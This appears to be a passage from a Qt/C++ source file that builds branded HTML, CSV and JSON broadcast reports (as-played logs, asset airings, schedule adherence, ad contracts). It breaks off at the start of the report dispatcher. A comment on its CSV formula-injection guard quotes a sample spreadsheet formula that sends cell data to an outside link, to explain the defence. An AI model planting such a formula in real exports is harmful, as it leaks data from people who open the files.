// ReportBuilder — branded HTML / CSV / JSON reports over as-run + media + schedule + contracts.
// Port of PlayPlay OBS server/reports.py (_shell, as_played, asset_report, assets_airings, full_report,
// adherence, contract_report, to_csv) onto the Supervisor's ScheduleStore. See docs/reports.md.
#include "reports.h"
#include "../schedule/schedulestore.h"
#include "../schedule/queryblocks.h"
#include "../schedule/formatclock.h"
#include "../schedule/runlistbuilder.h"
#include <QDateTime>
#include <QElapsedTimer>
#include <QLocale>
#include <QJsonDocument>
#include <QSet>
#include <QMap>
#include <QUrl>
#include <QDir>
#include <QRegularExpression>
#include <QtMath>
#include <QDebug>
#include <algorithm>
#include <functional>

using namespace sched;

// ---------------------------------------------------------------------------
// Local helpers
// ---------------------------------------------------------------------------
namespace {

constexpr int kMaxDays = 366;          // longest window any report accepts
constexpr int kChunkLimit = 100000;    // as-run rows fetched per 24 h chunk
constexpr int kMaxScan = 400000;       // rows scanned per report before we stop and flag `truncated`
constexpr int kScanBudgetMs = 1500;    // wall-clock budget of one report's as-run scans: reports run on the Supervisor's event-loop thread
                                       // (next to ScheduleExecutor::tick, telemetry and engine IPC), so a scan must never run unbounded
constexpr int kMaxEmitRows = 50000;    // airing rows an assets report materialises across all of its assets (HTML / JSON body size)
constexpr qint64 kDayMs = 86400000LL;

QString esc(const QString& s) { return s.toHtmlEscaped(); }
QString num(double v, int prec = 1) { return QString::number(v, 'f', prec); }
QString pct(double part, double whole, int prec = 1) { return whole > 0 ? num(100.0 * part / whole, prec) + "%" : QStringLiteral("—"); }

/// 0:00:00 style duration (negative values keep their sign).
QString hms(double sec) {
    const qint64 s = qRound64(qAbs(sec));
    return QString("%1%2:%3:%4").arg(sec < 0 ? "-" : "").arg(s / 3600).arg((s % 3600) / 60, 2, 10, QChar('0')).arg(s % 60, 2, 10, QChar('0'));
}
/// "+3s" / "-1m05s" variance text.
QString signedSec(double sec) {
    const qint64 s = qRound64(sec);
    if (qAbs(s) < 120) return QString("%1%2s").arg(s > 0 ? "+" : (s < 0 ? "-" : "")).arg(qAbs(s));
    return QString("%1%2m%3s").arg(s > 0 ? "+" : "-").arg(qAbs(s) / 60).arg(qAbs(s) % 60, 2, 10, QChar('0'));
}
QString fmtTs(qint64 ms, const QTimeZone& tz, const char* fmt = "yyyy-MM-dd HH:mm:ss") {
    return ms > 0 ? QDateTime::fromMSecsSinceEpoch(ms, tz).toString(QString::fromLatin1(fmt)) : QStringLiteral("—");
}
QDate parseDate(const QString& s, const QDate& def) { const QDate d = QDate::fromString(s.left(10), Qt::ISODate); return d.isValid() ? d : def; }
int clampInt(const QString& s, int def, int lo, int hi) { bool ok = false; int v = s.toInt(&ok); if (!ok) v = def; return qBound(lo, v, hi); }
double clampDouble(const QString& s, double def, double lo, double hi) { bool ok = false; double v = s.toDouble(&ok); if (!ok) v = def; return qBound(lo, v, hi); }
qint64 dayStart(const QDate& d, const QTimeZone& tz) { return QDateTime(d, QTime(0, 0), tz).toMSecsSinceEpoch(); }
QDate localDate(qint64 ms, const QTimeZone& tz) { return QDateTime::fromMSecsSinceEpoch(ms, tz).date(); }
int localHour(qint64 ms, const QTimeZone& tz) { return ms > 0 ? QDateTime::fromMSecsSinceEpoch(ms, tz).time().hour() : 0; }
int localMinuteOfDay(qint64 ms, const QTimeZone& tz) { const QTime t = QDateTime::fromMSecsSinceEpoch(ms, tz).time(); return t.hour() * 60 + t.minute(); }
QString longDate(const QDate& d) { return QLocale::c().toString(d, "dddd, MMMM d yyyy"); }
QString isoDate(const QDate& d) { return d.toString(Qt::ISODate); }
QDate todayIn(const QTimeZone& tz) { return QDateTime::currentDateTimeUtc().toTimeZone(tz).date(); }
QStringList splitList(const QString& s) { QStringList out; for (const QString& p : s.split(',', Qt::SkipEmptyParts)) { const QString t = p.trimmed(); if (!t.isEmpty()) out << t; } return out; }
QString joinSet(const QSet<QString>& s) { QStringList l(s.begin(), s.end()); l.sort(); return l.join(", "); }
QJsonArray toArray(const QSet<QString>& s) { QStringList l(s.begin(), s.end()); l.sort(); return QJsonArray::fromStringList(l); }
QJsonArray toArray(const QStringList& l) { return QJsonArray::fromStringList(l); }

/// Human status of an as-run row for report badges.
QString dispStatus(const AsRunRow& r) {
    if (r.eventType == "START") {
        if (r.status == "ON_TIME") return "on time";
        if (r.status == "LATE_START") return "late";
        if (r.status == "EARLY_START") return "early";
        if (r.status == "FILL") return "fill";
        if (r.status == "MANUAL") return "manual";
        return r.plannedStartMs > 0 ? r.status.toLower().replace('_', ' ') : QStringLiteral("unscheduled");
    }
    if (r.eventType == "SKIP") return "skipped";
    if (r.eventType == "FAILED") return "failed";
    if (r.eventType == "TRUNCATED") return "truncated";
    return r.eventType.toLower().replace('_', ' ');
}
QString pillClass(const QString& disp) {
    if (disp == "on time" || disp == "on_time" || disp == "on pace" || disp == "complete" || disp == "direct") return "on";
    if (disp == "late" || disp == "behind" || disp == "eligible via block") return "late";
    if (disp == "early") return "early";
    if (disp == "skipped" || disp == "failed" || disp == "truncated" || disp == "missed" || disp == "under-delivered" || disp == "orphan") return "bad";
    if (disp == "fill" || disp == "emergency") return "fill";
    return "uns";
}
QString pill(const QString& disp) { return QString("<span class='pill %1'>%2</span>").arg(pillClass(disp), esc(disp)); }
QString card(const QString& k, const QString& v, const QString& sub = QString()) {
    return QString("<div class='card'><div class='v'>%1</div><div class='k'>%2</div>%3</div>").arg(esc(v), esc(k), sub.isEmpty() ? QString() : "<div class='s'>" + esc(sub) + "</div>");
}
QString none(const QString& text) { return "<div class='none'>" + esc(text) + "</div>"; }
QString h2(const QString& text, const QString& small = QString(), const QString& id = QString()) {
    return QString("<h2%1>%2%3</h2>").arg(id.isEmpty() ? QString() : " id='" + esc(id) + "'", esc(text), small.isEmpty() ? QString() : "<small>" + esc(small) + "</small>");
}
QString thead(const QStringList& cols) {
    QString s = "<thead><tr>";
    for (const QString& c : cols) { const bool n = c.startsWith('#'); s += QString("<th%1>%2</th>").arg(n ? " class='n'" : "", esc(n ? c.mid(1) : c)); }
    return s + "</tr></thead>";
}
QString deltaCell(const QJsonValue& v) {
    if (v.isNull() || v.isUndefined()) return "<td class='t'>—</td>";
    const double s = v.toDouble();
    return QString("<td class='t %1'>%2</td>").arg(s > 5 ? "neg" : (s < -5 ? "early" : "pos"), signedSec(s));
}
QString thumbImg(const QString& id, int h = 72) {
    return id.isEmpty() ? QString() : QString("<img class='thumb' style='height:%1px' src='/thumbs/%2.jpg' alt='' onerror=\"this.style.display='none'\">").arg(h).arg(esc(id));
}
/// Simple CSS bar chart (no JS): one bar per entry, height relative to the max.
QString barChart(const QJsonArray& items, const char* labelKey, const char* valueKey, const QString& titleFmt, int height = 110) {
    double mx = 0; for (const auto& v : items) mx = qMax(mx, v.toObject().value(QLatin1String(valueKey)).toDouble());
    QString s = QString("<div class='chart' style='height:%1px'>").arg(height);
    for (const auto& v : items) {
        const QJsonObject o = v.toObject(); const double val = o.value(QLatin1String(valueKey)).toDouble();
        const int hpx = mx > 0 ? qMax(2, int((height - 22) * val / mx)) : 2;
        QString title = titleFmt; title.replace("{label}", o.value(QLatin1String(labelKey)).toVariant().toString()).replace("{value}", QString::number(val, 'f', val == qFloor(val) ? 0 : 1));
        s += QString("<div class='bc' title='%1'><div class='b%2' style='height:%3px'></div><div class='l'>%4</div></div>").arg(esc(title), val > 0 ? "" : " z").arg(hpx).arg(esc(o.value(QLatin1String(labelKey)).toVariant().toString()));
    }
    return s + "</div>";
}
QString progressBar(double pctValue, const QString& color = QString()) {
    const double p = qBound(0.0, pctValue, 100.0);
    return QString("<span class='prog'><span style='width:%1%%2'></span></span> <span class='t'>%3%</span>").arg(num(p, 0), color.isEmpty() ? QString() : ";background:" + color, num(pctValue, 0));
}

// --- CSV --------------------------------------------------------------------------------------
/// Spreadsheet formula guard: Excel / LibreOffice evaluate a cell that starts with = + - @ (or TAB / CR), so a media title such as
/// =HYPERLINK("http://x/?"&A2,"open") would run when the operator opens the export. Plain numbers (variance, duration, percentages
/// start with '-' legitimately) are left alone; every other cell starting with one of those characters gets a leading apostrophe.
QString csvGuard(const QString& s) {
    if (s.isEmpty()) return s;
    const QChar c = s.at(0);
    if (c != '=' && c != '+' && c != '-' && c != '@' && c != '\t' && c != '\r') return s;
    static const QRegularExpression plainNumber(QStringLiteral("^[+-]?\\d+(\\.\\d+)?$"));
    return plainNumber.match(s).hasMatch() ? s : "'" + s;
}
QString csvCell(const QString& cell) {
    const QString s = csvGuard(cell);
    if (s.isEmpty()) return s;
    const bool quote = s.contains(',') || s.contains('"') || s.contains('\n') || s.contains('\r') || s.contains('\t') || s.contains(';') || s.startsWith(' ') || s.endsWith(' ');
    if (!quote) return s;
    QString q = s; q.replace('"', "\"\""); return "\"" + q + "\"";
}
QByteArray csvDoc(const QStringList& headers, const QList<QStringList>& rows) {
    QString out; QStringList hs; for (const QString& h : headers) hs << csvCell(h); out += hs.join(',') + "\r\n";
    for (const QStringList& r : rows) { QStringList cs; for (const QString& c : r) cs << csvCell(c); out += cs.join(',') + "\r\n"; }
    return QByteArray("\xEF\xBB\xBF") + out.toUtf8();     // UTF-8 BOM so Excel opens it with the right encoding
}
QString jsStr(const QJsonValue& v) {
    if (v.isDouble()) { const double d = v.toDouble(); return d == qFloor(d) && qAbs(d) < 1e15 ? QString::number(qint64(d)) : QString::number(d, 'f', 2); }
    if (v.isBool()) return v.toBool() ? "true" : "false";
    if (v.isNull() || v.isUndefined()) return QString();
    if (v.isArray()) { QStringList l; for (const auto& x : v.toArray()) l << x.toVariant().toString(); return l.join(" | "); }
    return v.toString();
}

// --- as-run scanning -----------------------------------------------------------------------------
/// Row + wall-clock budget of one report. Several scans of the same report (contracts walks one span per campaign window) share it.
struct ScanBudget {
    QElapsedTimer clock; int seen = 0;
    ScanBudget() { clock.start(); }
    bool spent() const { return seen >= kMaxScan || clock.elapsed() > kScanBudgetMs; }
};
QStringList allChannelIds(ScheduleStore* st) { QStringList ids; for (const ChannelProfile& p : st->channels()) ids << p.id; return ids; }

/// Chunked, bounded iteration over the as-run log, one 24 h chunk at a time and (within a chunk) one channel at a time: as_run is
/// indexed on (channel_id, actual_start), so `WHERE actual_start BETWEEN ..` without a channel is a full table scan + temp b-tree
/// per chunk (measured: 366 chunks on a 60k-row table 6.2 s channel-less vs 0.8 s per channel, and the gap grows with the table),
/// while the per-channel range is an index range. Rows reach `fn` ordered by
/// (actualStartMs, rowId) whichever channels are scanned. Returns true when rows were left out: the row cap or the time budget
/// stopped the scan, or one chunk hit its LIMIT. (As-run rows of a channel that was deleted from the channels table are not reachable
/// through an all-channels scan; ask for that channel id explicitly.)
bool scanRows(ScheduleStore* st, const QStringList& channels, qint64 fromMs, qint64 toMs, const std::function<void(const AsRunRow&)>& fn, ScanBudget* shared = nullptr) {
    ScanBudget local; ScanBudget& bud = shared ? *shared : local;
    bool cut = false;
    for (qint64 a = fromMs; a <= toMs; a += kDayMs) {
        if (bud.spent()) return true;
        const qint64 b = qMin(toMs, a + kDayMs - 1);
        QList<AsRunRow> rows;
        for (const QString& ch : channels) { const QList<AsRunRow> part = st->asRun(ch, a, b, kChunkLimit); if (part.size() >= kChunkLimit) cut = true; rows += part; }
        if (channels.size() > 1) std::stable_sort(rows.begin(), rows.end(), [](const AsRunRow& x, const AsRunRow& y) { return x.actualStartMs != y.actualStartMs ? x.actualStartMs < y.actualStartMs : x.rowId < y.rowId; });
        for (const AsRunRow& r : rows) fn(r);
        bud.seen += rows.size();
    }
    return cut;
}
/// channel "" = every channel.
bool scanRows(ScheduleStore* st, const QString& channel, qint64 fromMs, qint64 toMs, const std::function<void(const AsRunRow&)>& fn) {
    return scanRows(st, channel.isEmpty() ? allChannelIds(st) : QStringList{ channel }, fromMs, toMs, fn);
}

QJsonObject rowJson(const AsRunRow& r, const QTimeZone& tz) {
    QJsonObject o;
    o["channel"] = r.channelId; o["event"] = r.eventType; o["status"] = r.status; o["disp"] = dispStatus(r);
    o["title"] = r.title; o["type"] = r.type; o["origin"] = r.origin; o["assetId"] = r.assetId; o["itemId"] = r.itemId;
    o["runlistItemId"] = r.runlistItemId; o["slotId"] = r.slotId; o["reason"] = r.reason;
    o["plannedStartMs"] = double(r.plannedStartMs); o["actualStartMs"] = double(r.actualStartMs);
    o["planned"] = fmtTs(r.plannedStartMs, tz); o["actual"] = fmtTs(r.actualStartMs, tz);
    const qint64 anchor = r.actualStartMs > 0 ? r.actualStartMs : r.plannedStartMs;
    o["date"] = anchor > 0 ? isoDate(localDate(anchor, tz)) : QString(); o["hour"] = localHour(anchor, tz);
    if (r.eventType == "START" && r.plannedStartMs > 0) o["varianceSec"] = r.varianceMs / 1000.0; else o["varianceSec"] = QJsonValue();
    o["durationSec"] = (r.actualDurationMs > 0 ? r.actualDurationMs : r.plannedDurationMs) / 1000.0;
    o["plannedDurationSec"] = r.plannedDurationMs / 1000.0;
    o["complete"] = r.eventType == "START" && r.actualEndMs > 0;
    return o;
}

// --- media -------------------------------------------------------------------------------------
/// Lazy media lookup: one SQL point query per distinct id (hits and misses are both remembered), never a load + JSON parse of the
/// whole library per request. The returned pointer is valid until the next find() (the cache may rehash); copy the record to keep it.
struct MediaIndex {
    ScheduleStore* st; mutable QHash<QString, MediaRecord> hit; mutable QSet<QString> miss;
    explicit MediaIndex(ScheduleStore* s) : st(s) {}
    const MediaRecord* find(const QString& id) const {
        if (id.isEmpty()) return nullptr;
        auto it = hit.constFind(id); if (it != hit.constEnd()) return &it.value();
        if (miss.contains(id)) return nullptr;
        bool f = false; const MediaRecord m = st->media(id, &f);
        if (!f) { miss.insert(id); return nullptr; }
        return &hit.insert(id, m).value();
    }
};
/// Channel time zones + labels resolved once per report (the store does an SQL lookup per channel()).
struct ChanInfo {
    QHash<QString, QTimeZone> tz; QHash<QString, QString> label; QTimeZone def;
    explicit ChanInfo(ScheduleStore* s, const QTimeZone& fallback) : def(fallback) {
        for (const ChannelProfile& p : s->channels()) { tz.insert(p.id, p.tz()); label.insert(p.id, p.callLetters.isEmpty() ? (p.name.isEmpty() ? p.id : p.name) : p.callLetters + " · " + p.name); }
    }
    QTimeZone tzOf(const QString& id) const { auto it = tz.constFind(id); return it == tz.constEnd() ? def : it.value(); }
    QString labelOf(const QString& id) const { return id.isEmpty() ? QStringLiteral("all channels") : label.value(id, id); }
};
QJsonObject mediaCard(const MediaRecord& m, const QTimeZone& tz) {
    QJsonObject o;
    o["id"] = m.id; o["title"] = m.title.isEmpty() ? m.id : m.title; o["type"] = m.type; o["durationSec"] = m.durationSec; o["series"] = m.series; o["client"] = m.client;
    o["category"] = m.extra.value("category").toString(); o["subcategory"] = m.extra.value("subcategory").toString();
    o["tags"] = m.extra.value("tags").toArray(); o["notes"] = m.extra.value("notes").toString(); o["origin"] = m.extra.value("origin").toString(); o["status"] = m.extra.value("status").toString();
    o["path"] = QDir::toNativeSeparators(m.path); o["thumbnail"] = m.thumbnailPath.isEmpty() ? QString() : "/thumbs/" + m.id + ".jpg";
    o["playCount"] = m.playCount; o["lastPlayedMs"] = double(m.lastPlayedMs); o["lastPlayed"] = fmtTs(m.lastPlayedMs, tz, "yyyy-MM-dd HH:mm");
    o["addedAtMs"] = double(m.addedAtMs); o["added"] = fmtTs(m.addedAtMs, tz, "yyyy-MM-dd"); o["archived"] = m.archived; o["priority"] = m.priority;
    o["allowedChannels"] = toArray(m.allowedChannels);
    o["availableStart"] = m.availableStartMs > 0 ? fmtTs(m.availableStartMs, tz, "yyyy-MM-dd HH:mm") : QString();
    o["availableEnd"] = m.availableEndMs > 0 ? fmtTs(m.availableEndMs, tz, "yyyy-MM-dd HH:mm") : QString();
    if (m.extra.contains("autogen")) o["autogen"] = m.extra.value("autogen").toObject();
    return o;
}
/// Could `m` air from this late-bound block (query or folder) at `atMs` on `channelId`? Uses the very matcher the RunlistBuilder
/// resolves the block with (types / categories / subcategories / series / tags / clients, length bounds, availability window,
/// allowedChannels, playout status), reading the block from SlotItem::query() / folder() — `fromJson` moves queryBlock and
/// folderBlock out of `extra`, so `extra.contains("queryBlock")` is never true for a stored slot.
bool blockEligible(const SlotItem& it, const QString& channelId, const MediaRecord& m, qint64 atMs) {
    QueryContext ctx; ctx.channelId = channelId; ctx.nowMs = atMs;
    const QJsonObject qj = it.query(), fj = it.folder();
    if (!qj.isEmpty()) { const QueryBlock b = QueryBlock::fromJson(qj); return b.isValid() && QueryBlocks::matches(m, b, ctx); }   // a query wins over a folder, as in RunlistBuilder::expandQuery
    if (fj.isEmpty()) return false;
    const FolderBlock f = FolderBlock::fromJson(fj);
    return f.isValid() && QueryBlocks::matches(m, QueryBlock(), ctx) /* playable + available + channel scope only */ && QueryBlocks::matchesFolder(m, f) && (f.cond.isEmpty() || f.cond.matches(m, ctx.nowMs));
}

// --- dayparts / aggregation ---------------------------------------------------------------------
struct Daypart { const char* name; int from, to; };
const Daypart kDayparts[6] = { {"Overnight 00-06", 0, 6}, {"Early 06-09", 6, 9}, {"Daytime 09-16", 9, 16}, {"Early fringe 16-19", 16, 19}, {"Prime 19-23", 19, 23}, {"Late night 23-24", 23, 24} };
int daypartIndex(int hour) { for (int i = 0; i < 6; ++i) if (hour >= kDayparts[i].from && hour < kDayparts[i].to) return i; return 0; }

struct Agg {
    QString name, key; int airings = 0, scheduled = 0, onTime = 0, late = 0, failures = 0; double airtimeSec = 0; QSet<QString> assets, channels; qint64 lastMs = 0;
    void add(const AsRunRow& r) {
        if (r.eventType == "START") {
            ++airings; airtimeSec += r.actualDurationMs / 1000.0; lastMs = qMax(lastMs, r.actualStartMs);
            if (r.plannedStartMs > 0) { ++scheduled; if (r.status == "ON_TIME") ++onTime; else if (r.status == "LATE_START") ++late; }
        } else if (r.eventType == "FAILED" || r.eventType == "SKIP") ++failures;
        if (!r.assetId.isEmpty()) assets.insert(r.assetId); channels.insert(r.channelId);
    }
    QJsonObject json(double totalAirtime, const QTimeZone& tz) const {
        QJsonObject o; o["key"] = key; o["name"] = name; o["airings"] = airings; o["airtimeSec"] = airtimeSec; o["uniqueAssets"] = assets.size();
        o["channels"] = toArray(channels); o["sharePct"] = totalAirtime > 0 ? 100.0 * airtimeSec / totalAirtime : 0.0;
        o["onTimePct"] = scheduled > 0 ? 100.0 * onTime / scheduled : QJsonValue(); o["late"] = late; o["failures"] = failures;
        o["lastAiredMs"] = double(lastMs); o["lastAired"] = fmtTs(lastMs, tz, "yyyy-MM-dd HH:mm"); return o;
    }
};
QJsonArray aggTable(const QHash<QString, Agg>& m, double totalAirtime, const QTimeZone& tz, int limit = 0, bool byAirings = false) {
    QList<const Agg*> l; for (auto it = m.constBegin(); it != m.constEnd(); ++it) l.append(&it.value());
    std::sort(l.begin(), l.end(), [byAirings](const Agg* a, const Agg* b) {
        if (byAirings) { if (a->airings != b->airings) return a->airings > b->airings; return a->airtimeSec > b->airtimeSec; }
        if (a->airtimeSec != b->airtimeSec) return a->airtimeSec > b->airtimeSec; return a->airings > b->airings; });
    QJsonArray out; for (const Agg* a : l) { if (limit > 0 && out.size() >= limit) break; out.append(a->json(totalAirtime, tz)); }
    return out;
}

const char* kCss = R"css(
  :root { color-scheme: light; --accent: %ACCENT%; }
  * { box-sizing: border-box; }
  body { font-family: "Helvetica Neue", Arial, system-ui, sans-serif; margin: 0; color: #14181d; background: #eef1f4; -webkit-print-color-adjust: exact; print-color-adjust: exact; }
  a { color: #0b4ea2; } a.q { color: inherit; text-decoration: none; border-bottom: 1px dotted #9aa8b5; }
  .wrap { max-width: 1060px; margin: 0 auto; padding: 0 20px 64px; }
  .mast { background: linear-gradient(180deg,#0b1220,#001830); color: #fff; margin: 0 -20px 22px; padding: 18px 24px 16px; border-bottom: 4px solid var(--accent); }
  .mast .top { display: flex; align-items: center; gap: 14px; flex-wrap: wrap; }
  .mast img { height: 44px; width: auto; display: block; }
  .mast .wm { font-size: 26px; font-weight: 800; letter-spacing: .3px; }
  .mast .wm b { color: var(--accent); font-weight: 800; }
  .mast .kicker { margin-left: auto; text-align: right; font-size: 11px; text-transform: uppercase; letter-spacing: 1.5px; color: #9fb3c8; }
  .mast h1 { margin: 12px 0 2px; font-size: 22px; letter-spacing: .3px; }
  .mast .sub { color: #b7c6d6; font-size: 13px; }
  .nav { display: flex; gap: 14px; flex-wrap: wrap; margin: 12px 0 0; font-size: 11.5px; text-transform: uppercase; letter-spacing: .8px; }
  .nav a { color: #9fb3c8; text-decoration: none; } .nav a:hover { color: #fff; }
  .cards { display: flex; gap: 12px; flex-wrap: wrap; margin: 4px 0 8px; }
  .card { background: #fff; border: 1px solid #d7dee6; border-radius: 10px; padding: 12px 18px; min-width: 120px; box-shadow: 0 1px 3px #0000001a; }
  .card .v { font-size: 23px; font-weight: 800; font-variant-numeric: tabular-nums; }
  .card .k { color: #64748b; font-size: 11px; text-transform: uppercase; letter-spacing: .8px; margin-top: 2px; }
  .card .s { color: #8a98a5; font-size: 11px; margin-top: 2px; }
  h2 { font-size: 15px; margin: 26px 0 8px; color: var(--accent); text-transform: uppercase; letter-spacing: 1px; }
  h2 small { color: #64748b; font-weight: 400; text-transform: none; letter-spacing: 0; margin-left: 8px; }
  .asset { background: #fff; border: 1px solid #d7dee6; border-radius: 12px; margin: 14px 0; box-shadow: 0 1px 3px #0000001a; overflow: hidden; }
  .asset > .hd { display: flex; align-items: baseline; gap: 10px; flex-wrap: wrap; padding: 12px 16px; border-left: 5px solid var(--accent); background: #fafbfc; }
  .asset .ti { font-size: 16px; font-weight: 700; } .asset .ti a { color: inherit; text-decoration: none; }
  .asset .meta { color: #64748b; font-size: 12.5px; }
  .asset .stat { margin-left: auto; font-size: 12.5px; color: #334155; font-variant-numeric: tabular-nums; }
  .mcard { display: flex; gap: 18px; background: #fff; border: 1px solid #d7dee6; border-radius: 12px; padding: 16px 18px; box-shadow: 0 1px 3px #0000001a; align-items: flex-start; flex-wrap: wrap; }
  .mcard .thumb { border-radius: 8px; background: #0b1220; max-width: 220px; object-fit: cover; }
  .mcard h3 { margin: 0 0 6px; font-size: 20px; }
  .kv { font-size: 13px; border-collapse: collapse; background: transparent; width: auto; }
  .kv td { padding: 2px 14px 2px 0; border: 0; vertical-align: top; } .kv td:first-child { color: #64748b; text-transform: uppercase; font-size: 11px; letter-spacing: .6px; padding-top: 4px; white-space: nowrap; }
  .kv tr:nth-child(even) td { background: transparent; }
  table { width: 100%; border-collapse: collapse; background: #fff; font-size: 13px; }
  .plain { border: 1px solid #d7dee6; border-radius: 10px; overflow: hidden; box-shadow: 0 1px 3px #0000001a; }
  th { background: #0b1220; color: #fff; text-align: left; padding: 8px 12px; font-size: 11px; text-transform: uppercase; letter-spacing: .5px; white-space: nowrap; }
  td { padding: 7px 12px; border-top: 1px solid #eef2f5; }
  tbody tr:nth-child(even) td { background: #f7f9fb; }
  tr.hr td { background: #e8edf3 !important; color: #0b1220; font-weight: 700; font-size: 12px; letter-spacing: .3px; }
  tr.hr td a { color: #0b1220; }
  td.n, th.n { text-align: right; font-variant-numeric: tabular-nums; }
  td.t { font-variant-numeric: tabular-nums; white-space: nowrap; }
  td.rk { color: #9aa8b5; width: 26px; }
  td.mono { font-family: Consolas, Menlo, monospace; font-size: 12px; }
  .pill { display: inline-block; padding: 1px 8px; border-radius: 999px; font-size: 11px; font-weight: 700; text-transform: uppercase; letter-spacing: .4px; white-space: nowrap; }
  .pill.on { background: #dcfce7; color: #15803d; } .pill.late { background: #fef3c7; color: #b45309; } .pill.early { background: #dbeafe; color: #1d4ed8; }
  .pill.uns { background: #e2e8f0; color: #475569; } .pill.bad { background: #fee2e2; color: #b91c1c; } .pill.fill { background: #ede9fe; color: #6d28d9; }
  .neg { color: #b45309; } .pos { color: #15803d; } .early { color: #1d4ed8; }
  .none { color: #8a98a5; padding: 8px 2px; font-style: italic; }
  .exec { background: #fff; border: 1px solid #d7dee6; border-left: 4px solid var(--accent); border-radius: 10px; padding: 4px 18px 10px; margin: 14px 0 4px; box-shadow: 0 1px 3px #0000001a; }
  .exec p { font-size: 14px; line-height: 1.55; }
  ul.bl { background: #fff; border: 1px solid #d7dee6; border-radius: 10px; padding: 12px 12px 12px 30px; margin: 6px 0; box-shadow: 0 1px 3px #0000001a; }
  ul.bl li { margin: 5px 0; font-size: 13.5px; line-height: 1.5; } ul.bl.warn { border-left: 4px solid #e0a800; }
  p.note { color: #44566a; font-size: 13px; font-style: italic; margin: 2px 0 6px; }
  .chart { display: flex; align-items: flex-end; gap: 3px; background: #fff; border: 1px solid #d7dee6; border-radius: 10px; padding: 10px 12px 4px; box-shadow: 0 1px 3px #0000001a; }
  .chart .bc { flex: 1; display: flex; flex-direction: column; justify-content: flex-end; align-items: center; min-width: 0; }
  .chart .b { width: 100%; background: var(--accent); border-radius: 3px 3px 0 0; } .chart .b.z { background: #e2e8f0; }
  .chart .l { font-size: 10px; color: #64748b; margin-top: 3px; font-variant-numeric: tabular-nums; }
  .prog { display: inline-block; width: 120px; height: 10px; background: #e2e8f0; border-radius: 6px; overflow: hidden; vertical-align: middle; }
  .prog span { display: block; height: 10px; background: var(--accent); }
  .two { display: grid; grid-template-columns: 1fr 1fr; gap: 14px; } @media (max-width: 720px) { .two { grid-template-columns: 1fr; } }
  .hbar { display: flex; align-items: center; gap: 8px; font-size: 12.5px; margin: 4px 0; } .hbar .nm { width: 140px; color: #334155; } .hbar .bar { flex: 1; height: 12px; background: #e2e8f0; border-radius: 6px; overflow: hidden; } .hbar .bar span { display: block; height: 100%; background: var(--accent); } .hbar .v { width: 120px; text-align: right; font-variant-numeric: tabular-nums; color: #334155; }
  form.rep { background: #fff; border: 1px solid #d7dee6; border-radius: 10px; padding: 12px 16px; margin: 10px 0; box-shadow: 0 1px 3px #0000001a; display: flex; gap: 10px; flex-wrap: wrap; align-items: flex-end; }
  form.rep label { display: flex; flex-direction: column; font-size: 11px; color: #64748b; text-transform: uppercase; letter-spacing: .6px; gap: 3px; }
  form.rep input, form.rep select { font: inherit; font-size: 13px; padding: 5px 8px; border: 1px solid #c9d3dd; border-radius: 6px; min-width: 110px; }
  form.rep button { font: inherit; font-size: 13px; padding: 6px 14px; border: 0; border-radius: 6px; background: var(--accent); color: #fff; font-weight: 700; cursor: pointer; }
  form.rep button.alt { background: #0b1220; }
  form.rep .d { width: 100%; font-size: 13px; color: #334155; margin: -2px 0 2px; }
  footer { margin-top: 34px; color: #8a98a5; font-size: 12px; border-top: 1px solid #d7dee6; padding-top: 10px; }
  .trunc { background: #fef3c7; color: #92400e; border: 1px solid #fcd34d; border-radius: 8px; padding: 8px 12px; margin: 10px 0; font-size: 13px; }
  @media print {
    body { background: #fff; } .nav, form.rep { display: none; }
    .card, .asset, table.plain, ul.bl, .exec, .chart, .mcard { box-shadow: none; }
    .asset, tr, .card { break-inside: avoid; } .mast { margin: 0 0 18px; }
  }
)css";

/// Small inline script every report page carries:
///  - /reports/ is bearer-token gated like /api/, so a page opened with ?token= keeps the token on its in-report links and forms;
///  - the index forms are GET forms and a browser encodes a space as '+', which the Supervisor's query decoder (QUrlQuery) keeps as a literal
///    '+' ("evening news" would match nothing): the submit handler builds the query with %20 and leaves unused (empty) fields out.
const char* kJs = R"js(
(function () {
  var T = ''; try { T = new URLSearchParams(location.search).get('token') || ''; } catch (e) {}
  function enc(s) { return encodeURIComponent(s); }
  function withTok(u) {
    if (!T || /[?&]token=/.test(u)) return u;
    var h = u.indexOf('#'), frag = h >= 0 ? u.slice(h) : '', base = h >= 0 ? u.slice(0, h) : u;
    return base + (base.indexOf('?') >= 0 ? '&' : '?') + 'token=' + enc(T) + frag;
  }
  window.ppRepUrl = withTok;
  var links = document.querySelectorAll('a[href^="/reports/"]');
  for (var i = 0; i < links.length; i++) links[i].setAttribute('href', withTok(links[i].getAttribute('href')));
  var forms = document.querySelectorAll('form.rep[action]');
  for (var j = 0; j < forms.length; j++) forms[j].addEventListener('submit', function (e) {
    e.preventDefault(); var f = e.currentTarget, els = f.elements, p = [];
    for (var k = 0; k < els.length; k++) { var el = els[k]; if (el.name && el.value !== '' && !el.disabled) p.push(enc(el.name) + '=' + enc(el.value)); }
    location.href = withTok(f.getAttribute('action') + (p.length ? '?' + p.join('&') : ''));
  });
})();
)js";

} // namespace

// ---------------------------------------------------------------------------
// Construction / dispatch
// ---------------------------------------------------------------------------
ReportBuilder::ReportBuilder(ScheduleStore* store, QObject* parent) : QObject(parent), m_store(store) {
    qInfo() << "[Reports] ReportBuilder ready:" << names().join(", ");
}

QStringList ReportBuilder::names() { return { "asplayed", "asset", "assets", "full", "adherence", "contracts", "top", "compare" }; }

QJsonObject ReportBuilder::catalogue() const {
    QJsonArray a;
    auto add = [&](const QString& name, const QString& title, const QString& params, bool csvOk) {
        QJsonObject o; o["name"] = name; o["title"] = title; o["params"] = params; o["json"] = "/api/v1/reports/" + (name == "asset" ? QString("asset/{id}") : name);
        o["html"] = "/reports/" + (name == "asset" ? QString("asset/{id}") : name) + ".html"; o["csv"] = csvOk; a.append(o); };
    add("asplayed", "As-played log", "channel, date | from,to, type, origin, q, events, limit", true);
    add("asset", "Per-asset report", "id, days, channel", true);
    add("assets", "Assets report (many assets)", "ids | q,type,category,client,channel ; days, limit", true);
    add("full", "Period / full report", "period=daily|weekly|monthly|custom, date, from, to, group=all|type|client|series|category, channel", true);
    add("adherence", "Schedule adherence", "channel, date, toleranceSec", true);
    add("contracts", "Ad contract delivery", "id, date", true);
    add("top", "Top assets", "days, n, type, channel", true);
    add("compare", "Compare assets", "ids, days, channel", true);
    QJsonObject o; o["reports"] = a; o["index"] = "/reports/index.html"; o["brand"] = brand(); o["channels"] = channelsJson(); return o;
}

QJsonObject ReportBuilder::run(const QString& name, const Q& q) const {
    if (!m_store || !m_store->isOpen()) { QJsonObject o; o["error"] = "store not open"; o["status"] = 503; return o; }
